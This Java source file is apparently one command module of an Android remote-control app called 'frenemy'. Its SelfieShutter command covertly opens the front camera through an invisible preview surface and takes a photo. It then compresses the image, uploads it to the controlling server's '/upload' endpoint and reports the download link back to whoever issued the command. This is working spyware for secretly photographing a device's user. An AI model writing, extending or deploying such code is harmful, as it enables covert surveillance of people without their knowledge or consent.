package com.theah64.frenemy.android.commandcenter.commands;

import android.content.Context;
import android.graphics.Bitmap;
import android.hardware.Camera;
import android.os.Handler;
import android.os.Looper;
import android.view.SurfaceView;
import android.view.View;

import com.nostra13.universalimageloader.core.ImageLoader;
import com.nostra13.universalimageloader.core.assist.FailReason;
import com.nostra13.universalimageloader.core.listener.ImageLoadingListener;
import com.theah64.frenemy.android.utils.APIRequestGateway;
import com.theah64.frenemy.android.utils.BitmapUtils;
import com.theah64.frenemy.android.utils.CommonUtils;
import com.theah64.frenemy.android.utils.MultipartAPIRequestBuilder;
import com.theah64.frenemy.android.utils.OkHttpUtils;

import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.json.JSONException;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Request;
import okhttp3.Response;

import static com.theah64.frenemy.android.utils.App.APP_DIRECTORY_PATH;

/**
 * Created by theapache64 on 10/6/17.
 */

public class SelfieShutter extends BaseCommand {


    private Callback callback;
    private Context context;

    public SelfieShutter(String command) throws CommandException, ParseException, CommandHelp {
        super(command);
    }


    @Override
    public void handle(final Context context, final Callback callback) {
        this.callback = callback;
        this.context = context;

        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                takeASelfie();
            }
        });
    }

    private int getFrontCameraId() {
        int camId = -1;
        int numberOfCameras = Camera.getNumberOfCameras();
        Camera.CameraInfo ci = new Camera.CameraInfo();

        for (int i = 0; i < numberOfCameras; i++) {
            Camera.getCameraInfo(i, ci);
            if (ci.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                camId = i;
            }
        }

        return camId;
    }

    private void takeASelfie() {

        // here below "this" is activity context.
        SurfaceView surface = new SurfaceView(context);
        Camera camera = Camera.open(getFrontCameraId());
        try {
            camera.setPreviewDisplay(surface.getHolder());
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        camera.startPreview();
        camera.takePicture(null, null, new Camera.PictureCallback() {
            public void onPictureTaken(byte[] data, Camera camera) {
                FileOutputStream outStream = null;
                try {
                    final long imageId = System.currentTimeMillis();

                    final File appDir = new File(APP_DIRECTORY_PATH);
                    if (!appDir.exists()) {
                        appDir.mkdirs();
                    }

                    String filePath = APP_DIRECTORY_PATH + File.separator + imageId + ".jpg";
                    outStream = new FileOutputStream(filePath);
                    outStream.write(data);
                    outStream.close();
                    callback.onInfo("Selfie taken and saved to " + filePath + " , Size: " + CommonUtils.getSizeInKB(new File(filePath)));
                    compressAndUpload(filePath, imageId);
                } catch (IOException e) {
                    e.printStackTrace();
                    callback.onError(e.getMessage());
                } finally {
                    camera.stopPreview();
                    camera.release();
                    camera = null;
                    System.out.println("Snapshot done");
                }
                System.out.println("OnPicture Taken");
            }
        });
    }

    private void compressAndUpload(final String filePath, final long imageId) {

        ImageLoader.getInstance().loadImage("file://" + filePath, new ImageLoadingListener() {
            @Override
            public void onLoadingStarted(String imageUri, View view) {
                callback.onInfo("Compression started...");
            }

            @Override
            public void onLoadingFailed(String imageUri, View view, FailReason failReason) {
                callback.onError("Failed to compress image");
            }

            @Override
            public void onLoadingComplete(String imageUri, View view, Bitmap loadedImage) {
                System.out.println("Image compressed : " + imageUri);
                new File(filePath).delete();

                final String cmpPath = APP_DIRECTORY_PATH + File.separator + "cmp_" + imageId + ".jpg";
                try {
                    BitmapUtils.saveBitmap(loadedImage, cmpPath);
                    callback.onInfo("Compressed image saved: " + cmpPath);

                    new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
                        @Override
                        public void onReadyToRequest(String apiKey, String frenemyId) {

                            //Uploading
                            final File cmpFile = new File(cmpPath);

                            callback.onInfo("Uploading compressed image: " + CommonUtils.getSizeInKB(cmpFile));

                            final Request photoUploadRequest = new MultipartAPIRequestBuilder("/upload", apiKey)
                                    .addFile(cmpFile, "file", MultipartAPIRequestBuilder.TYPE_IMAGE)
                                    .build();
                            OkHttpUtils.getInstance().getClient().newCall(photoUploadRequest).enqueue(new okhttp3.Callback() {
                                @Override
                                public void onFailure(Call call, IOException e) {
                                    callback.onError(e.getMessage());
                                }

                                @Override
                                public void onResponse(Call call, Response response) throws IOException {
                                    try {
                                        final com.theah64.frenemy.android.utils.Response uploadResp = new com.theah64.frenemy.android.utils.Response(OkHttpUtils.logAndGetStringBody(response));
                                        final String imageUrl = uploadResp.getJSONObjectData().getString("download_link");
                                        callback.onFinish("Image uploaded:" + CommonUtils.getIMGSRC(imageUrl, 200, 200));
                                        cmpFile.delete();
                                    } catch (com.theah64.frenemy.android.utils.Response.ResponseException | JSONException e) {
                                        e.printStackTrace();
                                        callback.onError(e.getMessage());
                                    }
                                }
                            });

                        }

                        @Override
                        public void onFailed(String reason) {
                            callback.onError(reason);
                        }
                    });
                } catch (IOException e) {
                    e.printStackTrace();
                    callback.onError(e.getMessage());
                }
            }

            @Override
            public void onLoadingCancelled(String imageUri, View view) {
                callback.onError("Compression cancelled");
            }
        });
    }

    @Override
    public Options getOptions() {
        return null;
    }
}
